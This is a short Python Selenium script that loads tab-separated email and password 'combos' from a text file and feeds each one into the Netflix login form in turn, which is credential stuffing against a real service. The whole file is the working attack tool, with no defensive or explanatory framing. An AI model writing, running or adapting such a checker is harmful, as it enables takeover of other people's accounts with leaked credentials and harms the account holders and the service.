from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time

site_url = "https://www.netflix.com/in/Login"
username_field_id = "id_userLoginId"
password_field_id = "id_password"
login_button_class = "login-button"

file=open('media/DB.txt','r')
with file as f:
	combos = f.readlines()
n=len(combos)
print("Number of combos to process : ",n)
options = Options()
#options.add_argument('--headless')
browser = webdriver.Firefox(firefox_options=options)
print('Firefox Opened')
browser.get(site_url)
print('Netflix Login Page Opened ( ',site_url,' )')

for combo in combos:
	email,password=combo.split('\t')
	print("\nInserting Email-ID : ",email, "\t password : ", password)
	browser.find_element_by_id(username_field_id).clear()
	browser.find_element_by_id(username_field_id).send_keys(email)
	browser.find_element_by_id(password_field_id).send_keys(password)
	browser.find_element_by_class_name(login_button_class).click()
	time.sleep(3)
	#browser.find_element_by_class_name('')
exit(0)
	
